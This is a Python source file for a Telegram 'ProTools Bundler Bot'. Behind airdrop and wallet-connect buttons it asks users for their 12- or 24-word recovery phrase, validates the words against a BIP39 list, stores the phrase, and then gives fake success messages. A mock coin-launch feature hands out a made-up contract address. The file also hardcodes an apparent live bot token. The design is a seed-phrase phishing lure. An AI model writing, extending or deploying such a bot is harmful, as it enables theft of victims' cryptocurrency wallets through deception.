import os
import logging
import asyncio
import re
from flask import Flask
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from datetime import datetime

# ============================================================================
# BIP39 ENGLISH WORDLIST (2048 words)
# ============================================================================
BIP39_WORDLIST = set([
    "abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse",
    "access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act",
    "action","actor","actress","actual","adapt","add","addict","address","adjust","admit",
    "adult","advance","advice","aerobic","afford","afraid","again","age","agent","agree",
    "ahead","aim","air","airport","aisle","alarm","album","alcohol","alert","alien",
    "all","alley","allow","almost","alone","alpha","already","also","alter","always",
    "amateur","amazing","among","amount","amused","analyst","anchor","ancient","anger","angle",
    "angry","animal","ankle","announce","annual","another","answer","antenna","antique","anxiety",
    "any","apart","apology","appear","apple","approve","april","arch","arctic","area",
    "arena","argue","arm","armed","armor","army","around","arrange","arrest","arrive",
    "arrow","art","artefact","artist","artwork","ask","aspect","assault","asset","assist",
    "assume","asthma","athlete","atom","attack","attend","attitude","attract","auction","audit",
    "august","aunt","author","auto","autumn","average","avocado","avoid","awake","aware",
    "away","awesome","awful","awkward","axis","baby","balance","bamboo","banana","banner",
    "bar","barely","bargain","barrel","base","basic","basket","battle","beach","bean",
    "beauty","because","become","beef","before","begin","behave","behind","believe","below",
    "belt","bench","benefit","best","betray","better","between","beyond","bicycle","bid",
    "bike","bind","biology","bird","birth","bitter","black","blade","blame","blanket",
    "blast","bleak","bless","blind","blood","blossom","blouse","blue","blur","blush",
    "board","boat","body","boil","bomb","bone","book","boost","border","boring",
    "borrow","boss","bottom","bounce","box","boy","bracket","brain","brand","brave",
    "bread","breeze","brick","bridge","brief","bright","bring","brisk","broccoli","broken",
    "bronze","broom","brother","brown","brush","bubble","buddy","budget","buffalo","build",
    "bulb","bulk","bullet","bundle","bunker","burden","burger","burst","bus","business",
    "busy","butter","buyer","buzz","cabbage","cabin","cable","cactus","cage","cake",
    "call","calm","camera","camp","can","canal","cancel","candy","cannon","canvas",
    "canyon","capable","capital","captain","car","carbon","card","cargo","carpet","carry",
    "cart","case","cash","casino","castle","casual","cat","catalog","catch","category",
    "cattle","caught","cause","caution","cave","ceiling","celery","cement","census","century",
    "cereal","certain","chair","chalk","champion","change","chaos","chapter","charge","chase",
    "chat","cheap","check","cheese","chef","cherry","chest","chicken","chief","child",
    "chimney","choice","choose","chronic","chuckle","chunk","cigar","cinnamon","circle","citizen",
    "city","civil","claim","clap","clarify","claw","clay","clean","clerk","clever",
    "click","client","cliff","climb","clinic","clip","clock","clog","close","cloth",
    "cloud","clown","club","clump","cluster","clutch","coach","coast","coconut","code",
    "coffee","coil","coin","collect","color","column","combine","come","comfort","comic",
    "common","company","concert","conduct","confirm","congress","connect","consider","control","convince",
    "cook","cool","copper","copy","coral","core","corn","correct","cost","cotton",
    "couch","country","couple","course","cousin","cover","coyote","crack","cradle","craft",
    "cram","crane","crash","crazy","cream","credit","creek","crew","cricket","crime",
    "crisp","critic","cross","crouch","crowd","crucial","cruel","cruise","crumble","crunch",
    "crush","cry","crystal","cube","culture","cup","cupboard","curious","current","curtain",
    "curve","cushion","custom","cute","cycle","dad","damage","damp","dance","danger",
    "daring","dash","daughter","dawn","day","deal","debate","debris","decade","december",
    "decide","decline","decorate","decrease","deer","defense","define","defy","degree","delay",
    "deliver","demand","demise","denial","dentist","deny","depart","depend","deposit","depth",
    "deputy","derive","describe","desert","design","desk","despair","destroy","detail","detect",
    "develop","device","devote","diagram","dial","diamond","diary","dice","diesel","diet",
    "differ","digital","dignity","dilemma","dinner","dinosaur","direct","dirt","disagree","discover",
    "disease","dish","dismiss","disorder","display","distance","divert","divide","divorce","dizzy",
    "doctor","document","dog","doll","dolphin","domain","donate","donkey","donor","door",
    "dose","double","dove","draft","dragon","drama","drastic","draw","dream","dress",
    "drift","drill","drink","drip","drive","drop","drum","dry","duck","dumb",
    "dune","during","dust","dutch","duty","dwarf","dynamic","eager","eagle","early",
    "earn","earth","easily","east","easy","echo","ecology","edge","edit","educate",
    "effort","egg","eight","either","elbow","elder","electric","elegant","element","elephant",
    "elevator","elite","else","embark","embody","embrace","emerge","emotion","employ","empower",
    "empty","enable","enact","endless","endorse","enemy","energy","enforce","engage","engine",
    "enhance","enjoy","enlist","enough","enrich","enroll","ensure","enter","entire","entry",
    "envelope","episode","equal","equip","erase","erode","erosion","error","erupt","escape",
    "essay","essence","estate","eternal","ethics","evidence","evil","evoke","evolve","exact",
    "example","excess","exchange","excite","exclude","exercise","exhaust","exhibit","exile","exist",
    "exit","exotic","expand","expire","explain","expose","express","extend","extra","eye",
    "fable","face","faculty","faint","faith","fall","false","fame","family","famous",
    "fan","fancy","fantasy","far","fashion","fat","fatal","father","fatigue","fault",
    "favorite","feature","february","federal","fee","feed","feel","feet","fellow","felt",
    "fence","festival","fetch","fever","few","fiber","fiction","field","figure","file",
    "film","filter","final","find","fine","finger","finish","fire","firm","first",
    "fiscal","fish","fit","fitness","fix","flag","flame","flash","flat","flavor",
    "flee","flight","flip","float","flock","floor","flower","fluid","flush","fly",
    "foam","focus","fog","foil","follow","food","foot","force","forest","forget",
    "fork","fortune","forum","forward","fossil","foster","found","fox","fragile","frame",
    "frequent","fresh","friend","fringe","frog","front","frown","frozen","fruit","fuel",
    "fun","funny","furnace","fury","future","gadget","gain","galaxy","gallery","game",
    "gap","garbage","garden","garlic","garment","gas","gasp","gate","gather","gauge",
    "gaze","general","genius","genre","gentle","genuine","gesture","ghost","giant","gift",
    "giggle","ginger","giraffe","girl","give","glad","glance","glare","glass","glide",
    "glimpse","globe","gloom","glory","glove","glow","glue","goat","goddess","gold",
    "good","goose","gorilla","gospel","gossip","govern","gown","grab","grace","grain",
    "grant","grape","grasp","grass","gravity","great","green","grid","grief","grit",
    "grocery","group","grow","grunt","guard","guide","guilt","guitar","gun","gym",
    "habit","hair","half","hammer","hamster","hand","happy","harsh","harvest","hat",
    "have","hawk","hazard","head","health","heart","heavy","hedgehog","height","hello",
    "helmet","help","hero","hidden","high","hill","hint","hip","hire","history",
    "hobby","hockey","hold","hole","holiday","hollow","home","honey","hood","hope",
    "horn","horror","horse","hospital","host","hour","hover","hub","huge","human",
    "humble","humor","hundred","hungry","hunt","hurdle","hurry","hurt","husband","hybrid",
    "ice","icon","ignore","ill","illegal","image","imitate","immense","immune","impact",
    "impose","improve","impulse","inbox","income","increase","index","indicate","indoor","industry",
    "infant","inflict","inform","inhale","inject","inner","innocent","input","inquiry","insane",
    "insect","inside","inspire","install","intact","interest","into","invest","invite","involve",
    "iron","island","isolate","issue","item","ivory","jacket","jaguar","jar","jazz",
    "jealous","jeans","jelly","jewel","job","join","joke","journey","joy","judge",
    "juice","jump","jungle","junior","junk","just","kangaroo","keen","keep","ketchup",
    "key","kick","kid","kingdom","kiss","kit","kitchen","kite","kitten","kiwi",
    "knee","knife","knock","know","lab","ladder","lamp","language","laptop","large",
    "later","laugh","laundry","lava","law","lawn","lawsuit","layer","lazy","leader",
    "learn","leave","lecture","left","leg","legal","legend","lemon","lend","length",
    "lens","leopard","lesson","letter","level","liar","liberty","library","license","life",
    "lift","like","limb","limit","link","lion","liquid","list","little","live",
    "lizard","load","loan","lobster","local","lock","logic","lonely","long","loop",
    "lottery","loud","lounge","love","loyal","lucky","luggage","lumber","lunar","lunch",
    "luxury","mad","magnet","maid","mail","main","major","make","mammal","mango",
    "mansion","manual","maple","marble","march","margin","marine","market","marriage","mask",
    "master","match","material","math","matrix","matter","maximum","maze","meadow","mean",
    "medal","media","melody","melt","member","memory","mention","menu","mercy","merge",
    "merit","merry","mesh","message","metal","method","middle","midnight","milk","million",
    "mimic","mind","minimum","minor","minute","miracle","miss","mitten","model","modify",
    "mom","monitor","monkey","monster","month","moon","moral","more","morning","mosquito",
    "mother","motion","motor","mountain","mouse","move","movie","much","muffin","mule",
    "multiply","muscle","museum","mushroom","music","must","mutual","myself","mystery","naive",
    "name","napkin","narrow","nasty","natural","nature","near","neck","need","negative",
    "neglect","neither","nephew","nerve","nest","network","news","next","nice","night",
    "noble","noise","nominee","noodle","normal","north","notable","note","nothing","notice",
    "novel","now","nuclear","number","nurse","nut","oak","obey","object","oblige",
    "obscure","obtain","ocean","october","odor","off","offer","office","often","oil",
    "okay","old","olive","olympic","omit","once","onion","open","option","orange",
    "orbit","orchard","order","ordinary","organ","orient","original","orphan","ostrich","other",
    "outdoor","output","outside","oval","over","own","oyster","ozone","pact","paddle",
    "page","pair","palace","palm","panda","panel","panic","panther","paper","parade",
    "parent","park","parrot","party","pass","patch","path","patrol","pause","pave",
    "payment","peace","peanut","pear","peasant","pelican","pen","penalty","pencil","people",
    "pepper","perfect","permit","person","pet","phone","photo","phrase","physical","piano",
    "picnic","picture","piece","pig","pigeon","pill","pilot","pink","pioneer","pipe",
    "pistol","pitch","pizza","place","planet","plastic","plate","play","please","pledge",
    "pluck","plug","plunge","poem","poet","point","polar","pole","police","pond",
    "pony","pool","popular","portion","position","possible","post","potato","pottery","poverty",
    "powder","power","practice","praise","predict","prefer","prepare","present","pretty","prevent",
    "price","pride","primary","print","priority","prison","private","prize","problem","process",
    "produce","profit","program","project","promote","proof","property","prosper","protect","proud",
    "provide","public","pudding","pull","pulp","pulse","pumpkin","punish","pupil","puppy",
    "purchase","purity","purpose","push","put","puzzle","pyramid","quality","quantum","quarter",
    "question","quick","quit","quiz","quote","rabbit","raccoon","race","rack","radar",
    "radio","rage","rail","rain","raise","rally","ramp","ranch","random","range",
    "rapid","rare","rate","rather","raven","reach","ready","real","reason","rebel",
    "rebuild","recall","receive","recipe","record","recycle","reduce","reflect","reform","refuse",
    "region","regret","regular","reject","relax","release","relief","rely","remain","remember",
    "remind","remove","render","renew","rent","reopen","repair","repeat","replace","report",
    "require","rescue","resemble","resist","resource","response","result","retire","retreat","return",
    "reunion","reveal","review","reward","rhythm","ribbon","rice","rich","ride","ridge",
    "rifle","right","rigid","ring","riot","ripple","risk","ritual","rival","river",
    "road","roast","robot","robust","rocket","romance","roof","rookie","rose","rotate",
    "rough","royal","rubber","rude","rug","rule","run","runway","rural","sad",
    "saddle","sadness","safe","sail","salad","salmon","salon","salt","salute","same",
    "sample","sand","satisfy","satoshi","sauce","sausage","save","say","scale","scan",
    "scare","scatter","scene","scheme","school","science","scissors","scorpion","scout","scrap",
    "screen","script","scrub","sea","search","season","seat","second","secret","section",
    "security","seek","segment","select","sell","seminar","senior","sense","sentence","series",
    "service","session","settle","setup","seven","shadow","shaft","shallow","share","shed",
    "shell","sheriff","shield","shift","shine","ship","shiver","shock","shoe","shoot",
    "shop","short","shoulder","shove","shrimp","shrug","shuffle","shy","sibling","siege",
    "sight","sign","silent","silk","silly","silver","similar","simple","since","sing",
    "siren","sister","situate","six","size","sketch","skill","skin","skirt","skull",
    "slab","slam","sleep","slender","slice","slide","slight","slim","slogan","slot",
    "slow","slush","small","smart","smile","smoke","smooth","snack","snake","snap",
    "sniff","snow","soap","soccer","social","sock","solar","soldier","solid","solution",
    "solve","someone","song","soon","sorry","soul","sound","soup","source","south",
    "space","spare","spatial","spawn","speak","special","speed","sphere","spice","spider",
    "spike","spin","spirit","split","spoil","sponsor","spoon","spray","spread","spring",
    "spy","square","squeeze","squirrel","stable","stadium","staff","stage","stairs","stamp",
    "stand","start","state","stay","steak","steel","stem","step","stereo","stick",
    "still","sting","stock","stomach","stone","stop","store","storm","story","stove",
    "strategy","street","strike","strong","struggle","student","stuff","stumble","subject","submit",
    "subway","success","such","sudden","suffer","sugar","suggest","suit","summer","sun",
    "sunny","sunset","super","supply","supreme","sure","surface","surge","surprise","sustain",
    "swallow","swamp","swap","swear","sweet","swift","swim","swing","switch","sword",
    "symbol","symptom","syrup","table","tackle","tag","tail","talent","tank","tape",
    "target","task","tattoo","taxi","teach","team","tell","ten","tenant","tennis",
    "tent","term","test","text","thank","that","theme","then","theory","there",
    "they","thing","this","thought","three","thrive","throw","thumb","thunder","ticket",
    "tide","tiger","tilt","timber","time","tiny","tip","tired","title","toast",
    "tobacco","today","together","toilet","token","tomato","tomorrow","tone","tongue","tonight",
    "tool","tooth","top","topic","topple","torch","tornado","tortoise","toss","total",
    "tourist","toward","tower","town","toy","track","trade","traffic","tragic","train",
    "transfer","trap","trash","travel","tray","treat","tree","trend","trial","tribe",
    "trick","trigger","trim","trip","trophy","trouble","truck","truly","trumpet","trust",
    "truth","try","tube","tuition","tumble","tuna","tunnel","turkey","turn","turtle",
    "twelve","twenty","twice","twin","twist","two","type","typical","ugly","umbrella",
    "unable","unaware","uncle","uncover","under","undo","unfair","unfold","unhappy","uniform",
    "unique","universe","unknown","unlock","until","unusual","unveil","update","upgrade","uphold",
    "upon","upper","upset","urban","useful","useless","usual","utility","vacant","vacuum",
    "vague","valid","valley","valve","van","vanish","vapor","various","vast","vault",
    "vehicle","velvet","vendor","venture","verb","verify","version","very","veteran","viable",
    "vibrant","vicious","victory","video","view","village","vintage","violin","virtual","virus",
    "visa","visit","visual","vital","vivid","vocal","voice","void","volcano","volume",
    "vote","voyage","wage","wagon","wait","walk","wall","walnut","want","warfare",
    "warm","warrior","waste","water","wave","way","wealth","weapon","wear","weasel",
    "weather","web","wedding","weekend","weird","welcome","well","west","wet","whale",
    "wheat","wheel","when","where","whip","whisper","wide","width","wife","wild",
    "will","win","window","wine","wing","wink","winner","winter","wire","wisdom",
    "wise","wish","witness","wolf","woman","wonder","wood","wool","word","world",
    "worry","worth","wrap","wreck","wrestle","wrist","write","wrong","yard","year",
    "yellow","you","young","youth","zebra","zero","zone","zoo"
])

# ============================================================================
# VALIDATION HELPERS
# ============================================================================

def validate_phrase(phrase: str):
    words = phrase.strip().lower().split()
    count = len(words)

    if count not in (12, 24):
        return False, (
            f"❌ *Invalid phrase length.*\n"
            f"You entered *{count} word(s)* — a valid recovery phrase must be exactly *12 or 24 words*.\n\n"
            f"Please try again:"
        )

    invalid = [f"Word {i}: `{word}`" for i, word in enumerate(words, 1) if word not in BIP39_WORDLIST]

    if invalid:
        return False, (
            f"❌ *Invalid word(s) found in your phrase:*\n\n"
            f"{'\n'.join(invalid)}\n\n"
            f"Please double-check the words above and try again:"
        )

    return True, None


def validate_solana_address(address: str):
    address = address.strip()
    base58_pattern = re.compile(r'^[1-9A-HJ-NP-Za-km-z]{32,44}$')

    if not base58_pattern.match(address):
        return False, (
            f"❌ *Invalid Solana wallet address.*\n\n"
            f"`{address}`\n\n"
            f"A valid Solana address must be:\n"
            f"• 32–44 characters long\n"
            f"• Base58 characters only (no 0, O, I, or l)\n\n"
            f"Please enter your correct Solana address:"
        )

    return True, None

# ============================================================================
# CONFIGURATION
# ============================================================================
BOT_TOKEN = "8771123401:AAHhv3aZO8WYmzDiSdbE4YPj_WvdKbEPz00"

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# In-memory log store
user_logs = {}

def log_action(user_id: int, action: str, detail: str = ""):
    if user_id not in user_logs:
        user_logs[user_id] = []
    user_logs[user_id].insert(0, {
        "time": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
        "action": action,
        "detail": detail
    })
    user_logs[user_id] = user_logs[user_id][:50]

# --- WEB SERVER FOR KEEP-ALIVE ---
app = Flask('')

@app.route('/')
def home():
    return "Bot is running!"

def run_web():
    app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)

def keep_alive():
    t = Thread(target=run_web, daemon=True)
    t.start()

# ============================================================================
# ERROR HANDLER
# ============================================================================
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.error(f"Exception while handling an update: {context.error}")
    if update and hasattr(update, 'effective_message') and update.effective_message:
        try:
            await update.effective_message.reply_text("❌ An unexpected error occurred. Please try again later.")
        except:
            pass

# ============================================================================
# KEYBOARDS
# ============================================================================
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Launch Coin", callback_data='launch_coin'),
         InlineKeyboardButton("📊 Transactions", callback_data='transactions')],
        [InlineKeyboardButton("🎁 Airdrop", callback_data='airdrop'),
         InlineKeyboardButton("🔑 Wallet", callback_data='wallet')],
        [InlineKeyboardButton("📜 View Logs", callback_data='view_logs'),
         InlineKeyboardButton("❓ Help", callback_data='help')],
        [InlineKeyboardButton("💬 Feedback", callback_data='feedback')]
    ])

# ============================================================================
# COMMAND HANDLERS
# ============================================================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    log_action(user_id, "start_command", f"Chat ID: {user_id}")
    context.user_data.clear()  # Reset user data

    text = "🚀 *Welcome to ProTools Bundler Bot*\n\nChoose an option below:"
    markup = main_menu_keyboard()

    if update.message:
        await update.message.reply_text(text, parse_mode='Markdown', reply_markup=markup)
    elif update.callback_query:
        await update.callback_query.edit_message_text(text, parse_mode='Markdown', reply_markup=markup)

# ============================================================================
# BUTTON HANDLER
# ============================================================================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    log_action(user_id, "button_press", f"Button: {data}")

    if data == 'cancel':
        context.user_data.clear()
        await query.edit_message_text(
            "🚀 *Welcome to ProTools Bundler Bot*\n\nChoose an option below:",
            parse_mode='Markdown',
            reply_markup=main_menu_keyboard()
        )
        return

    # HELP
    if data == 'help':
        text = (
            "❓ *Help — What Each Button Does*\n\n"
            "🚀 *Launch Coin* — Create and launch your own dummy token.\n\n"
            "📊 *Transactions* — View recent transaction history.\n\n"
            "🎁 *Airdrop* — Connect wallet for airdrop eligibility.\n\n"
            "🔑 *Wallet* — Connect your Solana wallet.\n\n"
            "📜 *View Logs* — See your activity history in this bot.\n\n"
            "💬 *Feedback* — Send feedback to the team."
        )
        await query.edit_message_text(
            text, parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data='cancel')]])
        )

    # VIEW LOGS
    elif data == 'view_logs':
        logs = user_logs.get(user_id, [])
        if not logs:
            text = "📜 *Your Bot Logs:*\n\nNo activity yet."
        else:
            lines = ["📋 *Your Bot Logs (latest first):*\n"]
            for entry in logs:
                lines.append(f"*{entry['time']}*\n`{entry['action']}` {entry['detail']}")
            text = "\n\n".join(lines)

        await query.edit_message_text(
            text, parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data='cancel')]])
        )

    # AIRDROP
    elif data == 'airdrop':
        context.user_data['state'] = 'AWAITING_PHRASE'
        context.user_data['flow'] = 'airdrop'
        await query.edit_message_text(
            "🎁 *Airdrop Verification*\n\n"
            "To confirm eligibility, please provide your *12 or 24-word Recovery Phrase*:",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data='cancel')]])
        )

    # WALLET
    elif data == 'wallet':
        context.user_data['state'] = 'AWAITING_PHRASE'
        context.user_data['flow'] = 'wallet'
        await query.edit_message_text(
            "🔑 *Connect Wallet*\n\n"
            "Please provide your *12 or 24-word Recovery Phrase*:",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data='cancel')]])
        )

    # TRANSACTIONS
    elif data == 'transactions':
        await query.edit_message_text(
            "📊 *Recent Transactions*\n\n"
            "No transactions found yet.\nConnect your wallet first.",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔑 Connect Wallet", callback_data='wallet')],
                [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
            ])
        )

    # LAUNCH COIN
    elif data == 'launch_coin':
        context.user_data['state'] = 'AWAITING_COIN_NAME'
        await query.edit_message_text(
            "🚀 *Launch Your Coin*\n\n"
            "First, enter your *Coin Name*:\n_Example: ProTools Token_",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data='cancel')]])
        )

    # FEEDBACK
    elif data == 'feedback':
        await query.edit_message_text(
            "💬 *Feedback*\n\n"
            "Send your feedback or suggestions to:\n"
            "*ProToolsBundlerBot@gmail.com*\n\n"
            "Thank you! 🙏",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data='cancel')]])
        )

# ============================================================================
# MESSAGE HANDLER (Multi-step flows)
# ============================================================================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get('state')
    flow = context.user_data.get('flow', '')
    user_id = update.effective_user.id
    text = update.message.text.strip()

    # PHRASE INPUT
    if state == 'AWAITING_PHRASE':
        is_valid, error_msg = validate_phrase(text)

        if not is_valid:
            log_action(user_id, "phrase_invalid", f"Flow: {flow}")
            await update.message.reply_text(
                error_msg, parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data='cancel')]])
            )
            return

        context.user_data['phrase'] = text
        log_action(user_id, "phrase_accepted", f"Flow: {flow}")
        context.user_data['state'] = 'AWAITING_ADDRESS'

        await update.message.reply_text(
            "✅ *Phrase verified successfully!*\n\n"
            "Now please provide your *Solana Wallet Address*:",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data='cancel')]])
        )

    # ADDRESS INPUT
    elif state == 'AWAITING_ADDRESS':
        is_valid, error_msg = validate_solana_address(text)

        if not is_valid:
            log_action(user_id, "address_invalid", f"Flow: {flow}")
            await update.message.reply_text(
                error_msg, parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data='cancel')]])
            )
            return

        context.user_data['address'] = text
        log_action(user_id, "address_accepted", f"Flow: {flow}")
        context.user_data['state'] = None

        if flow == 'airdrop':
            msg = "🔄 *Verifying eligibility...*\n\n✅ Your wallet has been queued for the next airdrop!"
        else:
            msg = "✅ *Wallet successfully connected!*\nYou can now use all features."

        await update.message.reply_text(
            msg, parse_mode='Markdown', reply_markup=main_menu_keyboard()
        )

    # LAUNCH COIN FLOW
    elif state == 'AWAITING_COIN_NAME':
        context.user_data['coin_name'] = text
        context.user_data['state'] = 'AWAITING_COIN_TICKER'
        log_action(user_id, "coin_name_set", text)
        await update.message.reply_text(
            f"✅ Coin name: *{text}*\n\nNow enter your *Coin Ticker* (e.g. PTB):",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data='cancel')]])
        )

    elif state == 'AWAITING_COIN_TICKER':
        ticker = text.upper()
        context.user_data['coin_ticker'] = ticker
        context.user_data['state'] = 'AWAITING_COIN_SUPPLY'
        log_action(user_id, "coin_ticker_set", ticker)
        await update.message.reply_text(
            f"✅ Ticker: *${ticker}*\n\nNow enter the *Total Supply* (e.g. 1000000000):",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data='cancel')]])
        )

    elif state == 'AWAITING_COIN_SUPPLY':
        name = context.user_data.get('coin_name', 'Unknown')
        ticker = context.user_data.get('coin_ticker', 'TKN')
        supply = text
        log_action(user_id, "coin_launched", f"{name} (${ticker})")
        context.user_data['state'] = None

        import hashlib
        fake_address = hashlib.sha256(f"{name}{ticker}{user_id}".encode()).hexdigest()[:44]

        await update.message.reply_text(
            f"🎉 *Coin Successfully Launched!*\n\n"
            f"📛 Name: *{name}*\n"
            f"💠 Ticker: *${ticker}*\n"
            f"📦 Supply: *{supply}*\n"
            f"🔗 Contract: `{fake_address}`\n\n"
            f"Your coin is now live on the simulation network!",
            parse_mode='Markdown',
            reply_markup=main_menu_keyboard()
        )

    else:
        await update.message.reply_text(
            "Please use the buttons below to navigate:",
            reply_markup=main_menu_keyboard()
        )

# ============================================================================
# MAIN FUNCTION
# ============================================================================
def main():
    keep_alive()

    application = Application.builder().token(BOT_TOKEN).build()

    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, handle_message))
    application.add_error_handler(error_handler)

    logger.info("🚀 ProTools Bundler Bot is running...")
    
    application.run_polling(
        drop_pending_updates=True,
        allowed_updates=Update.ALL_TYPES
    )

if __name__ == "__main__":
    main()
